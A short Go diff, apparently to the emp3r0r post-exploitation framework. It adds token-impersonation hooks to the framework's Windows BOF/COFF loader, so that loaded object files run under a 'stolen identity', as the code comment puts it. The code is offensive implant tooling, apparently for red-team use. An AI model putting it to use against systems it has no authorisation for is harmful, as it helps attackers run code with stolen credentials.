@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"runtime/debug"
 	"strings"
+	"sync"
 	"syscall"
 	"unsafe"
 
@@ -14,6 +15,23 @@ import (
 	"github.com/RIscRIpt/pecoff/windef"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"golang.org/x/sys/windows"
+)
+
+// PreExecHook is called on the BOF goroutine immediately before the COFF
+// entry point is invoked. It receives the impersonation token handle (0 if
+// none). The hook should lock the OS thread and impersonate.
+var PreExecHook func(token uintptr)
+
+// PostExecHook is called on the BOF goroutine immediately after the COFF
+// entry point returns (or panics). It should revert impersonation and
+// unlock the OS thread.
+var PostExecHook func()
+
+// activeToken is the token handle passed to RunWindowsCOFF for the current
+// execution; it is read by invokeMethod's goroutine.
+var (
+	activeTokenMu sync.Mutex
+	activeToken   uintptr
 )
 
 const (
@@ -535,6 +553,22 @@ func invokeMethod(methodName string, argBytes []byte, parsedCoff *pecoff.File, s
 			}
 
 			isExecutingBOF = true
+
+			// If a token was provided, impersonate on this goroutine before
+			// calling the BOF so that any Win32 APIs it invokes see the
+			// stolen identity.
+			activeTokenMu.Lock()
+			tok := activeToken
+			activeTokenMu.Unlock()
+			if tok != 0 && PreExecHook != nil {
+				PreExecHook(tok)
+				defer func() {
+					if PostExecHook != nil {
+						PostExecHook()
+					}
+				}()
+			}
+
 			syscall.SyscallN(entryPoint, uintptr(unsafe.Pointer(&argBytes[0])), uintptr(len(argBytes)))
 			isExecutingBOF = false
 		}
